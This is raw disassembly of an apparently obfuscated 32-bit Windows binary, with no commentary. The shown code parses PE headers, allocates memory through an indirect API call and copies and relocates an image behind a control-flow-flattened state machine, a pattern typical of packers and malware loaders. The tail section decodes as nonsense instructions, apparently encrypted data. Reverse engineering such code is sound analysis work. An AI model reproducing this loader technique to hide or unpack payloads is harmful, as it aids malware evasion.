  4197cc:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  4197d3:	mov    edx,0xf89c8584
  4197d8:	mov    DWORD PTR [ebp-0x8],edx
  4197db:	mov    eax,DWORD PTR [ebp+0x1c]
  4197de:	mov    DWORD PTR [ebp+0x1c],eax
  4197e1:	mov    eax,DWORD PTR [ebp+0x1c]
  4197e4:	mov    eax,DWORD PTR [eax+0x190]
  4197ea:	mov    eax,DWORD PTR [eax]
  4197ec:	mov    DWORD PTR [ebp-0x24],ecx
  4197ef:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197f2:	mov    ecx,DWORD PTR [ecx+0x190]
  4197f8:	mov    ecx,DWORD PTR [ecx]
  4197fa:	add    ecx,DWORD PTR [eax+0x3c]
  4197fd:	mov    DWORD PTR [ebp+0x10],ecx
  419800:	mov    eax,DWORD PTR [ebp+0x8]
  419803:	xor    eax,edi
  419805:	add    eax,ebx
  419807:	mov    DWORD PTR [ebp-0x4],eax
  41980a:	mov    eax,DWORD PTR [ebp+0x8]
  41980d:	xor    eax,edi
  41980f:	add    eax,ebx
  419811:	mov    DWORD PTR [ebp+0x18],eax
  419814:	mov    eax,DWORD PTR [ebp+0x10]
  419817:	mov    eax,DWORD PTR [eax+0x50]
  41981a:	sub    eax,0xc
  41981d:	mov    DWORD PTR [ebp-0x28],eax
  419820:	mov    eax,DWORD PTR [ebp+0x10]
  419823:	mov    eax,DWORD PTR [eax+0x38]
  419826:	mov    ecx,DWORD PTR [ebp+0x10]
  419829:	dec    eax
  41982a:	test   DWORD PTR [ecx+0x54],eax
  41982d:	mov    eax,DWORD PTR [ebp+0x10]
  419830:	je     0x41984a
  419832:	mov    eax,DWORD PTR [eax+0x38]
  419835:	mov    ecx,DWORD PTR [ebp+0x10]
  419838:	mov    ecx,DWORD PTR [ecx+0x54]
  41983b:	dec    eax
  41983c:	not    eax
  41983e:	and    ecx,eax
  419840:	mov    eax,DWORD PTR [ebp+0x10]
  419843:	mov    eax,DWORD PTR [eax+0x38]
  419846:	add    eax,ecx
  419848:	jmp    0x41984d
  41984a:	mov    eax,DWORD PTR [eax+0x54]
  41984d:	mov    DWORD PTR [ebp+0x1c],eax
  419850:	mov    eax,DWORD PTR [ebp+0x8]
  419853:	xor    eax,edi
  419855:	add    eax,ebx
  419857:	mov    DWORD PTR [ebp+0x18],eax
  41985a:	mov    eax,DWORD PTR [ebp+0x8]
  41985d:	xor    eax,edi
  41985f:	add    eax,ebx
  419861:	mov    DWORD PTR [ebp+0x18],eax
  419864:	mov    eax,DWORD PTR [ebp+0x8]
  419867:	mov    ecx,DWORD PTR [ebp-0x24]
  41986a:	xor    eax,edi
  41986c:	add    eax,ebx
  41986e:	mov    DWORD PTR [ecx],eax
  419870:	mov    DWORD PTR [ebp+0x18],edx
  419873:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41987a:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  419881:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  419888:	mov    eax,DWORD PTR [ebp-0x8]
  41988b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41988e:	xor    eax,edi
  419890:	add    eax,ebx
  419892:	imul   eax,ecx
  419895:	mov    ecx,DWORD PTR [ebp+0x8]
  419898:	mov    edx,DWORD PTR [ebp-0x28]
  41989b:	xor    ecx,edi
  41989d:	lea    ecx,[ecx+edx*1+0x3272e2]
  4198a4:	cmp    eax,ecx
  4198a6:	jae    0x419c57
  4198ac:	mov    eax,DWORD PTR [ebp+0x8]
  4198af:	xor    eax,edi
  4198b1:	add    eax,ebx
  4198b3:	mov    DWORD PTR [ebp+0x18],eax
  4198b6:	mov    eax,DWORD PTR [ebp+0x1c]
  4198b9:	add    eax,DWORD PTR [ebp-0x1c]
  4198bc:	mov    DWORD PTR [ebp-0x4],eax
  4198bf:	push   DWORD PTR [ebp-0x4]
  4198c2:	mov    esi,DWORD PTR [ebp-0x1c]
  4198c5:	mov    ecx,DWORD PTR [ebp+0x10]
  4198c8:	call   0x4189c0
  4198cd:	mov    DWORD PTR [ebp+0xc],eax
  4198d0:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4198d7:	mov    eax,DWORD PTR [ebp-0x18]
  4198da:	xor    eax,edi
  4198dc:	lea    ecx,[ebp-0x40]
  4198df:	add    eax,ebx
  4198e1:	push   ecx
  4198e2:	call   0x418fa3
  4198e7:	mov    eax,DWORD PTR [ebp+0xc]
  4198ea:	test   eax,eax
  4198ec:	je     0x41993c
  4198ee:	mov    eax,DWORD PTR [ebp-0x18]
  4198f1:	xor    eax,edi
  4198f3:	add    eax,ebx
  4198f5:	push   eax
  4198f6:	push   DWORD PTR [ebp+0xc]
  4198f9:	lea    eax,[ebp-0x40]
  4198fc:	push   eax
  4198fd:	call   0x418e4a
  419902:	mov    eax,DWORD PTR [ebp-0x4]
  419905:	mov    DWORD PTR [ebp-0x18],eax
  419908:	mov    eax,DWORD PTR [ebp-0x18]
  41990b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41990e:	sub    eax,ecx
  419910:	mov    DWORD PTR [ebp-0x18],eax
  419913:	mov    eax,DWORD PTR [ebp+0xc]
  419916:	mov    ecx,DWORD PTR [ebp+0xc]
  419919:	mov    eax,DWORD PTR [eax+0x10]
  41991c:	add    eax,DWORD PTR [ecx+0xc]
  41991f:	mov    ecx,DWORD PTR [ebp-0x18]
  419922:	cmp    ecx,eax
  419924:	jb     0x41993c
  419926:	mov    eax,DWORD PTR [ebp+0xc]
  419929:	mov    eax,DWORD PTR [eax+0xc]
  41992c:	mov    ecx,DWORD PTR [ebp+0xc]
  41992f:	add    eax,DWORD PTR [ecx+0x8]
  419932:	mov    ecx,DWORD PTR [ebp-0x18]
  419935:	sub    eax,ecx
  419937:	jmp    0x419c2a
  41993c:	push   0xc
  41993e:	push   DWORD PTR [ebp-0x4]
  419941:	lea    eax,[ebp-0x4c]
  419944:	push   eax
  419945:	call   0x418e4a
  41994a:	mov    eax,0xf89c8585
  41994f:	mov    DWORD PTR [ebp-0x2c],eax
  419952:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  419959:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  419960:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  419967:	lea    ecx,[ebp-0x2c]
  41996a:	mov    DWORD PTR [ebp-0xc],ecx
  41996d:	lea    ecx,[ebp-0x30]
  419970:	mov    DWORD PTR [ebp-0x10],ecx
  419973:	lea    ecx,[ebp-0x34]
  419976:	mov    DWORD PTR [ebp+0xc],ecx
  419979:	lea    ecx,[ebp-0x38]
  41997c:	mov    DWORD PTR [ebp-0x14],ecx
  41997f:	mov    ecx,DWORD PTR [ebp+0x8]
  419982:	xor    ecx,edi
  419984:	add    ecx,ebx
  419986:	mov    DWORD PTR [ebp-0x18],ecx
  419989:	jmp    0x419b85
  41998e:	cmp    eax,0xf89c85bb
  419993:	je     0x419b97
  419999:	mov    ecx,DWORD PTR [ebp-0x8]
  41999c:	xor    ecx,edi
  41999e:	mov    esi,eax
  4199a0:	add    ecx,ebx
  4199a2:	mov    DWORD PTR [ebp+0x18],ecx
  4199a5:	mov    eax,DWORD PTR [ebp-0x18]
  4199a8:	xor    esi,edi
  4199aa:	lea    eax,[eax+esi*1+0x3272e2]
  4199b1:	mov    DWORD PTR [ebp-0x18],eax
  4199b4:	mov    eax,DWORD PTR [ebp-0x8]
  4199b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4199ba:	xor    eax,edi
  4199bc:	add    eax,ebx
  4199be:	cmp    ecx,eax
  4199c0:	jne    0x4199d5
  4199c2:	mov    eax,DWORD PTR [ebp+0x8]
  4199c5:	xor    eax,edi
  4199c7:	add    eax,ebx
  4199c9:	push   eax
  4199ca:	push   0xc
  4199cc:	lea    eax,[ebp-0x4c]
  4199cf:	push   eax
  4199d0:	call   0x4193d7
  4199d5:	mov    eax,DWORD PTR [ebp-0xc]
  4199d8:	mov    eax,DWORD PTR [eax]
  4199da:	xor    eax,edi
  4199dc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4199e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4199e6:	xor    ecx,edi
  4199e8:	movzx  eax,al
  4199eb:	add    ecx,ebx
  4199ed:	cmp    eax,ecx
  4199ef:	je     0x419b6d
  4199f5:	mov    eax,DWORD PTR [ebp-0x10]
  4199f8:	mov    eax,DWORD PTR [eax]
  4199fa:	xor    eax,edi
  4199fc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a03:	mov    ecx,DWORD PTR [ebp+0x8]
  419a06:	xor    ecx,edi
  419a08:	movzx  eax,al
  419a0b:	add    ecx,ebx
  419a0d:	cmp    eax,ecx
  419a0f:	je     0x419b6d
  419a15:	mov    eax,DWORD PTR [ebp+0xc]
  419a18:	mov    eax,DWORD PTR [eax]
  419a1a:	xor    eax,edi
  419a1c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a23:	mov    ecx,DWORD PTR [ebp+0x8]
  419a26:	xor    ecx,edi
  419a28:	movzx  eax,al
  419a2b:	add    ecx,ebx
  419a2d:	cmp    eax,ecx
  419a2f:	je     0x419b6d
  419a35:	mov    eax,DWORD PTR [ebp-0x14]
  419a38:	mov    eax,DWORD PTR [eax]
  419a3a:	xor    eax,edi
  419a3c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a43:	mov    ecx,DWORD PTR [ebp+0x8]
  419a46:	xor    ecx,edi
  419a48:	movzx  eax,al
  419a4b:	add    ecx,ebx
  419a4d:	cmp    eax,ecx
  419a4f:	je     0x419b6d
  419a55:	mov    eax,DWORD PTR [ebp-0x10]
  419a58:	mov    eax,DWORD PTR [eax]
  419a5a:	xor    eax,edi
  419a5c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a63:	mov    ecx,DWORD PTR [ebp-0xc]
  419a66:	mov    ecx,DWORD PTR [ecx]
  419a68:	xor    ecx,edi
  419a6a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a71:	xor    al,cl
  419a73:	mov    ecx,DWORD PTR [ebp+0xc]
  419a76:	mov    ecx,DWORD PTR [ecx]
  419a78:	xor    ecx,edi
  419a7a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a81:	or     al,cl
  419a83:	mov    ecx,DWORD PTR [ebp-0xc]
  419a86:	mov    ecx,DWORD PTR [ecx]
  419a88:	xor    ecx,edi
  419a8a:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419a91:	cmp    cl,al
  419a93:	jne    0x419b6d
  419a99:	mov    eax,DWORD PTR [ebp+0xc]
  419a9c:	mov    eax,DWORD PTR [eax]
  419a9e:	xor    eax,edi
  419aa0:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aa7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aaa:	mov    ecx,DWORD PTR [ecx]
  419aac:	xor    ecx,edi
  419aae:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ab5:	xor    al,cl
  419ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  419aba:	mov    ecx,DWORD PTR [ecx]
  419abc:	xor    ecx,edi
  419abe:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ac5:	or     al,cl
  419ac7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aca:	mov    ecx,DWORD PTR [ecx]
  419acc:	xor    ecx,edi
  419ace:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419ad5:	cmp    cl,al
  419ad7:	jne    0x419b6d
  419add:	mov    eax,DWORD PTR [ebp-0x14]
  419ae0:	mov    eax,DWORD PTR [eax]
  419ae2:	xor    eax,edi
  419ae4:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aeb:	mov    ecx,DWORD PTR [ebp+0xc]
  419aee:	mov    ecx,DWORD PTR [ecx]
  419af0:	xor    ecx,edi
  419af2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419af9:	xor    al,cl
  419afb:	mov    ecx,DWORD PTR [ebp-0xc]
  419afe:	mov    ecx,DWORD PTR [ecx]
  419b00:	xor    ecx,edi
  419b02:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b09:	or     al,cl
  419b0b:	mov    ecx,DWORD PTR [ebp+0xc]
  419b0e:	mov    ecx,DWORD PTR [ecx]
  419b10:	xor    ecx,edi
  419b12:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b19:	cmp    cl,al
  419b1b:	jne    0x419b6d
  419b1d:	mov    eax,DWORD PTR [ebp-0x14]
  419b20:	mov    eax,DWORD PTR [eax]
  419b22:	xor    eax,edi
  419b24:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419b2b:	mov    ecx,DWORD PTR [ebp-0xc]
  419b2e:	mov    ecx,DWORD PTR [ecx]
  419b30:	xor    ecx,edi
  419b32:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b39:	xor    al,cl
  419b3b:	mov    ecx,DWORD PTR [ebp-0x10]
  419b3e:	mov    ecx,DWORD PTR [ecx]
  419b40:	xor    ecx,edi
  419b42:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b49:	or     al,cl
  419b4b:	mov    ecx,DWORD PTR [ebp-0x14]
  419b4e:	mov    ecx,DWORD PTR [ecx]
  419b50:	xor    ecx,edi
  419b52:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b59:	cmp    cl,al
  419b5b:	jne    0x419b6d
  419b5d:	lea    eax,[ebp-0x4c]
  419b60:	push   eax
  419b61:	call   0x419628
  419b66:	mov    ecx,DWORD PTR [ebp-0x44]
  419b69:	cmp    eax,ecx
  419b6b:	je     0x419b77
  419b6d:	mov    eax,DWORD PTR [ebp+0x8]
  419b70:	xor    eax,edi
  419b72:	add    eax,ebx
  419b74:	mov    DWORD PTR [ebp+0x18],eax
  419b77:	mov    eax,DWORD PTR [ebp-0x8]
  419b7a:	xor    eax,edi
  419b7c:	lea    eax,[eax+esi*1+0x3272e2]
  419b83:	xor    eax,edi
  419b85:	mov    ecx,DWORD PTR [ebp+0x8]
  419b88:	mov    edx,DWORD PTR [ebp+0x18]
  419b8b:	xor    ecx,edi
  419b8d:	add    ecx,ebx
  419b8f:	cmp    edx,ecx
  419b91:	je     0x41998e
  419b97:	mov    eax,DWORD PTR [ebp+0x8]
  419b9a:	mov    ecx,DWORD PTR [ebp+0x18]
  419b9d:	xor    eax,edi
  419b9f:	add    eax,ebx
  419ba1:	cmp    ecx,eax
  419ba3:	jne    0x419bb6
  419ba5:	mov    eax,DWORD PTR [ebp-0x8]
  419ba8:	mov    ecx,DWORD PTR [ebp+0x1c]
  419bab:	xor    eax,edi
  419bad:	lea    eax,[eax+ecx*1+0x3272e2]
  419bb4:	jmp    0x419c2d
  419bb6:	push   0x18
  419bb8:	push   DWORD PTR [ebp-0x4]
  419bbb:	lea    eax,[ebp-0x64]
  419bbe:	push   eax
  419bbf:	call   0x418e4a
  419bc4:	mov    eax,DWORD PTR [ebp+0x8]
  419bc7:	mov    ecx,DWORD PTR [ebp-0x18]
  419bca:	xor    eax,edi
  419bcc:	add    eax,ebx
  419bce:	cmp    eax,ecx
  419bd0:	je     0x419be5
  419bd2:	mov    eax,DWORD PTR [ebp+0x8]
  419bd5:	xor    eax,edi
  419bd7:	add    eax,ebx
  419bd9:	push   eax
  419bda:	push   0x18
  419bdc:	lea    eax,[ebp-0x64]
  419bdf:	push   eax
  419be0:	call   0x4193d7
  419be5:	mov    eax,DWORD PTR [ebp-0x4]
  419be8:	add    eax,0x18
  419beb:	mov    DWORD PTR [ebp+0x18],eax
  419bee:	push   DWORD PTR [ebp-0x50]
  419bf1:	push   DWORD PTR [ebp+0x18]
  419bf4:	mov    eax,DWORD PTR [ebp-0x54]
  419bf7:	add    eax,DWORD PTR [ebp-0x20]
  419bfa:	push   eax
  419bfb:	call   0x418e4a
  419c00:	mov    eax,DWORD PTR [ebp+0x8]
  419c03:	mov    ecx,DWORD PTR [ebp-0x18]
  419c06:	xor    eax,edi
  419c08:	add    eax,ebx
  419c0a:	cmp    eax,ecx
  419c0c:	je     0x419c1f
  419c0e:	push   0x0
  419c10:	push   DWORD PTR [ebp-0x50]
  419c13:	mov    eax,DWORD PTR [ebp-0x54]
  419c16:	add    eax,DWORD PTR [ebp-0x20]
  419c19:	push   eax
  419c1a:	call   0x4193d7
  419c1f:	mov    eax,DWORD PTR [ebp-0x24]
  419c22:	mov    ecx,DWORD PTR [ebp-0x50]
  419c25:	add    DWORD PTR [eax],ecx
  419c27:	mov    eax,DWORD PTR [ebp-0x50]
  419c2a:	add    eax,DWORD PTR [ebp+0x1c]
  419c2d:	mov    DWORD PTR [ebp+0x1c],eax
  419c30:	mov    eax,DWORD PTR [ebp-0x8]
  419c33:	mov    ecx,DWORD PTR [ebp+0x1c]
  419c36:	xor    eax,edi
  419c38:	add    eax,ebx
  419c3a:	imul   eax,ecx
  419c3d:	mov    ecx,DWORD PTR [ebp+0x8]
  419c40:	mov    edx,DWORD PTR [ebp-0x28]
  419c43:	xor    ecx,edi
  419c45:	lea    ecx,[ecx+edx*1+0x3272e2]
  419c4c:	cmp    eax,ecx
  419c4e:	jb     0x4198ac
  419c54:	mov    esi,DWORD PTR [ebp+0x14]
  419c57:	mov    eax,DWORD PTR [ebp-0x20]
  419c5a:	mov    DWORD PTR [esi],eax
  419c5c:	jmp    0x419ca3
  419c5e:	mov    ecx,DWORD PTR [ebp+0x8]
  419c61:	mov    edx,DWORD PTR [ebp+0xc]
  419c64:	xor    ecx,edi
  419c66:	xor    edx,edi
  419c68:	add    ecx,ebx
  419c6a:	add    edx,ebx
  419c6c:	cmp    ecx,edx
  419c6e:	jne    0x419c82
  419c70:	mov    eax,ds:0x7f642d1e
  419c75:	imul   eax,eax,0x9f15fcef
  419c7b:	mov    ds:0x7f642d1e,eax
  419c80:	jmp    0x419ca3
  419c82:	mov    ecx,DWORD PTR [ebp+0x8]
  419c85:	xor    ecx,edi
  419c87:	add    ecx,ebx
  419c89:	cmp    eax,ecx
  419c8b:	je     0x419c99
  419c8d:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  419c97:	jmp    0x419ca3
  419c99:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  419ca3:	pop    edi
  419ca4:	pop    esi
  419ca5:	pop    ebx
  419ca6:	leave  
  419ca7:	ret    0x18
  419caa:	push   ebp
  419cab:	mov    ebp,esp
  419cad:	and    esp,0xfffffff8
  419cb0:	mov    eax,DWORD PTR [ebp+0x20]
  419cb3:	sub    esp,0x14
  419cb6:	push   ebx
  419cb7:	mov    ebx,DWORD PTR [ebp+0x14]
  419cba:	push   esi
  419cbb:	push   edi
  419cbc:	cmp    eax,0xf89c8585
  419cc1:	jne    0x419ccd
  419cc3:	push   0xf89c8584
  419cc8:	jmp    0x419dff
  419ccd:	mov    eax,DWORD PTR [ebp+0x20]
  419cd0:	cmp    eax,0xf89c8584
  419cd5:	jne    0x419ce1
  419cd7:	push   0xf89c85bb
  419cdc:	jmp    0x419dff
  419ce1:	mov    eax,DWORD PTR [ebp+0x20]
  419ce4:	cmp    eax,0xf89c85bb
  419ce9:	jne    0x419cf5
  419ceb:	push   0xf89c85ba
  419cf0:	jmp    0x419dff
  419cf5:	mov    eax,DWORD PTR [ebp+0x20]
  419cf8:	cmp    eax,0xf89c85ba
  419cfd:	jne    0x419d09
  419cff:	push   0xf89c85b9
  419d04:	jmp    0x419dff
  419d09:	mov    ecx,DWORD PTR [ebp+0x20]
  419d0c:	mov    eax,0xf89c85be
  419d11:	cmp    ecx,eax
  419d13:	jne    0x419dcf
  419d19:	mov    eax,DWORD PTR [ebp+0x10]
  419d1c:	mov    DWORD PTR [esp+0xc],eax
  419d20:	mov    eax,DWORD PTR [ebp+0x18]
  419d23:	mov    DWORD PTR [esp+0x14],eax
  419d27:	mov    eax,DWORD PTR [ebp+0xc]
  419d2a:	mov    DWORD PTR [esp+0x18],eax
  419d2e:	mov    eax,DWORD PTR [ebp+0x8]
  419d31:	mov    DWORD PTR [esp+0x10],eax
  419d35:	mov    eax,DWORD PTR [esp+0x10]
  419d39:	mov    ecx,DWORD PTR [esp+0x14]
  419d3d:	mov    edi,0x751089b
  419d42:	xor    eax,edi
  419d44:	mov    esi,0x3272e2
  419d49:	add    eax,esi
  419d4b:	mov    DWORD PTR [ecx],eax
  419d4d:	mov    eax,DWORD PTR [esp+0xc]
  419d51:	mov    eax,DWORD PTR [eax+0x194]
  419d57:	mov    ecx,DWORD PTR [eax]
  419d59:	mov    eax,DWORD PTR [esp+0xc]
  419d5d:	mov    eax,DWORD PTR [eax+0x194]
  419d63:	mov    eax,DWORD PTR [eax]
  419d65:	add    eax,DWORD PTR [ecx+0x3c]
  419d68:	mov    ecx,DWORD PTR [esp+0xc]
  419d6c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  419d72:	mov    ecx,DWORD PTR [ecx+0x14]
  419d75:	push   0x4
  419d77:	push   0x3000
  419d7c:	push   DWORD PTR [eax+0x50]
  419d7f:	push   0x0
  419d81:	call   ecx
  419d83:	mov    DWORD PTR [ebx],eax
  419d85:	mov    eax,DWORD PTR [esp+0x10]
  419d89:	push   DWORD PTR [esp+0xc]
  419d8d:	xor    eax,edi
  419d8f:	add    eax,esi
  419d91:	mov    DWORD PTR [esp+0x20],eax
  419d95:	lea    eax,[esp+0x20]
  419d99:	push   eax
  419d9a:	push   ebx
  419d9b:	push   DWORD PTR [esp+0x20]
  419d9f:	push   DWORD PTR [esp+0x28]
  419da3:	push   DWORD PTR [esp+0x24]
  419da7:	call   0x41976c
  419dac:	mov    eax,DWORD PTR [esp+0x10]
  419db0:	mov    ecx,DWORD PTR [ebx]
  419db2:	xor    eax,edi
  419db4:	add    eax,esi
  419db6:	cmp    ecx,eax
  419db8:	je     0x419e16
  419dba:	mov    eax,DWORD PTR [esp+0x18]
  419dbe:	mov    ecx,DWORD PTR [esp+0x14]
  419dc2:	xor    eax,edi
  419dc4:	add    eax,esi
  419dc6:	imul   eax,DWORD PTR [esp+0x1c]
  419dcb:	mov    DWORD PTR [ecx],eax
  419dcd:	jmp    0x419e16
  419dcf:	mov    ecx,DWORD PTR [ebp+0x20]
  419dd2:	cmp    ecx,0xf89c85b9
  419dd8:	jne    0x419de1
  419dda:	push   0xf89c85b8
  419ddf:	jmp    0x419dff
  419de1:	mov    ecx,DWORD PTR [ebp+0x20]
  419de4:	cmp    ecx,0xf89c85b8
  419dea:	jne    0x419df3
  419dec:	push   0xf89c85bf
  419df1:	jmp    0x419dff
  419df3:	mov    ecx,DWORD PTR [ebp+0x20]
  419df6:	cmp    ecx,0xf89c85bf
  419dfc:	jne    0x419e16
  419dfe:	push   eax
  419dff:	push   DWORD PTR [ebp+0x1c]
  419e02:	push   DWORD PTR [ebp+0x18]
  419e05:	push   ebx
  419e06:	push   DWORD PTR [ebp+0x10]
  419e09:	push   DWORD PTR [ebp+0xc]
  419e0c:	push   DWORD PTR [ebp+0x8]
  419e0f:	call   0x419caa
  419e14:	mov    DWORD PTR [ebx],eax
  419e16:	mov    eax,DWORD PTR [ebx]
  419e18:	pop    edi
  419e19:	pop    esi
  419e1a:	pop    ebx
  419e1b:	mov    esp,ebp
  419e1d:	pop    ebp
  419e1e:	ret    0x1c
  419e21:	push   ebp
  419e22:	mov    ebp,esp
  419e24:	sub    esp,0xc
  419e27:	mov    eax,0xf89c8585
  419e2c:	mov    DWORD PTR [ebp-0x8],eax
  419e2f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  419e36:	mov    ecx,DWORD PTR [ebp-0x8]
  419e39:	xor    ecx,0x751089b
  419e3f:	add    ecx,0x3272e2
  419e45:	mov    DWORD PTR [ebp-0x4],ecx
  419e48:	mov    ecx,DWORD PTR [ebp+0xc]
  419e4b:	push   eax
  419e4c:	mov    DWORD PTR [ebp+0xc],ecx
  419e4f:	push   DWORD PTR [ebp+0xc]
  419e52:	lea    eax,[ebp-0x4]
  419e55:	push   DWORD PTR [ebp+0x8]
  419e58:	push   eax
  419e59:	push   DWORD PTR [ebp+0xc]
  419e5c:	push   DWORD PTR [ebp-0xc]
  419e5f:	push   DWORD PTR [ebp-0x8]
  419e62:	call   0x419caa
  419e67:	mov    DWORD PTR [ebp-0x4],eax
  419e6a:	mov    eax,DWORD PTR [ebp-0x4]
  419e6d:	leave  
  419e6e:	ret    0x8
  419e71:	dec    esp
  419e72:	inc    ecx
  419e73:	mov    ebp,0xeffebd16
  419e78:	pop    ebx
  419e79:	xchg   ebx,eax
  419e7a:	and    DWORD PTR [ebx-0x47],0x25e9dd
  419e81:	gs sbb al,0x1
  419e84:	add    BYTE PTR [edi-0x1cfffffd],ch
  419e8a:	sub    al,0xd4
  419e8c:	or     dl,BYTE PTR [esi]
  419e8e:	xchg   ebx,eax
  419e8f:	retf   
  419e90:	jecxz  0x419ec4
  419e92:	pusha  
  419e93:	sub    BYTE PTR fs:[edx],bh
  419e96:	bound  edi,QWORD PTR [ecx+0x5d]
  419e99:	out    0x66,al
  419e9b:	jge    0x419e7d
  419e9d:	mov    ds:0x2bc47344,eax
  419ea2:	lods   al,BYTE PTR ds:[esi]
  419ea3:	scas   al,BYTE PTR es:[edi]
  419ea4:	pop    ecx
  419ea5:	repz std 
  419ea7:	xchg   ebx,eax
  419ea8:	sub    al,0xdb
  419eaa:	jno    0x419e3f
  419eac:	cmp    DWORD PTR [esi-0x1b1e48ef],edx
  419eb2:	jecxz  0x419ecb
  419eb4:	cli    
  419eb5:	in     eax,0xf7
  419eb7:	pop    es
  419eb8:	dec    ebp
  419eb9:	pusha  
  419eba:	sti    
  419ebb:	outs   dx,DWORD PTR ds:[esi]
  419ebc:	and    eax,DWORD PTR [ebx-0x1e]
  419ebf:	and    eax,0x6c233e87
  419ec4:	mov    edi,0x9508d927
  419ec9:	in     al,dx
  419eca:	mov    bh,BYTE PTR es:[ebx]
  419ecd:	cmp    eax,0x824227ad
  419ed2:	hlt    
  419ed3:	mov    edi,0xd35fd78d
  419ed8:	jbe    0x419ea8
  419eda:	retf   
  419edb:	or     esp,DWORD PTR [eax+0x2e104c49]
  419ee1:	lods   al,BYTE PTR ds:[esi]
  419ee2:	fnstsw WORD PTR [edi-0x3e]
  419ee5:	ins    DWORD PTR es:[edi],dx
  419ee6:	mov    ds:0x969a8447,al
  419eeb:	mov    ecx,0x9dd1e625
  419ef0:	push   ebp
  419ef1:	sbb    eax,0x2b86fd4f
  419ef6:	pop    esi
  419ef7:	mov    ds:0x77bd10c5,al
  419efc:	adc    BYTE PTR [eax-0x1d],cl
  419eff:	dec    ebp
  419f00:	(bad)  
  419f01:	xchg   ebp,eax
  419f02:	adc    edx,edi
  419f04:	cdq    
  419f05:	shl    BYTE PTR [ebx+ecx*8+0x5ddf4e77],1
  419f0c:	outs   dx,BYTE PTR ds:[esi]
  419f0d:	xchg   ebp,eax
  419f0e:	sahf   
  419f0f:	pop    es
  419f10:	inc    ebx
  419f11:	pop    ecx
  419f12:	adc    al,0xa3
  419f14:	in     eax,dx
  419f15:	out    dx,eax
  419f16:	pop    edi
  419f17:	ds jle 0x419ecd
  419f1a:	in     al,0x1f
  419f1c:	sub    ah,ah
  419f1e:	xchg   esp,eax
  419f1f:	ins    BYTE PTR es:[edi],dx
  419f20:	jge    0x419f0f
  419f22:	fisttp QWORD PTR [ecx+0x460d5e6b]
  419f28:	ds jae 0x419f55
  419f2b:	sub    al,0x64
  419f2d:	adc    BYTE PTR [ebx-0x54],ah
  419f30:	jo     0x419f9a
  419f32:	jnp    0x419ee6
  419f34:	sub    esp,esi
  419f36:	sub    cl,al
  419f38:	call   0x9060b1b0
  419f3d:	add    bh,BYTE PTR [ebp+0x5f8aba42]
  419f43:	inc    eax
  419f44:	mov    eax,0xac31956
  419f49:	outs   dx,BYTE PTR ds:[esi]
  419f4a:	loopne 0x419f37
  419f4c:	(bad)  [ebx]
  419f4e:	push   eax
  419f4f:	out    0x43,al
  419f51:	pop    ds
  419f52:	push   ds
  419f53:	push   ss
  419f54:	mov    esp,0x647eeb37
  419f59:	fadd   DWORD PTR [esi+0x62]
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	shr    DWORD PTR [esi+0x6f],1
  419f60:	xor    BYTE PTR [esi+0x52],bl
  419f63:	push   ecx
  419f64:	lock adc al,0xfa
  419f67:	pop    eax
  419f68:	xchg   BYTE PTR [ecx-0x1de2cbec],dl
  419f6e:	mov    ah,BYTE PTR [ebp-0x378f8aa7]
  419f74:	dec    ecx
  419f75:	adc    BYTE PTR [edx+0x53],ah
  419f78:	retf   0x16f3
  419f7b:	leave  
  419f7c:	(bad)  
  419f7d:	pop    edx
  419f7e:	and    edx,esp
  419f80:	into   
  419f81:	mov    WORD PTR ds:0xd8a4dcf2,cs
  419f87:	mov    ch,0x4f
  419f89:	jb     0x419fc5
  419f8b:	(bad)
  419f8f:	push   edx
  419f90:	rcl    esp,1
  419f92:	xchg   ebp,eax
  419f93:	jecxz  0x419f6e
  419f95:	cmc    
  419f96:	out    0xb9,eax
  419f98:	push   ds
  419f99:	and    eax,0x22352070
  419f9e:	or     al,0x6
  419fa0:	dec    edx
  419fa1:	jnp    0x419ff0
  419fa3:	sti    
  419fa4:	adc    cl,BYTE PTR [ecx+0x5bd61c15]
  419faa:	push   edi
  419fab:	jno    0x419f61
  419fad:	push   ebx
  419fae:	adc    BYTE PTR ds:0x25e8f954,bh
  419fb4:	arpl   WORD PTR [edx+0x574f9bbf],si
  419fba:	and    BYTE PTR [edx-0x70],ah
  419fbd:	bound  ebp,QWORD PTR [edx+ebx*4]
  419fc0:	jnp    0x419f87
  419fc2:	pop    esi
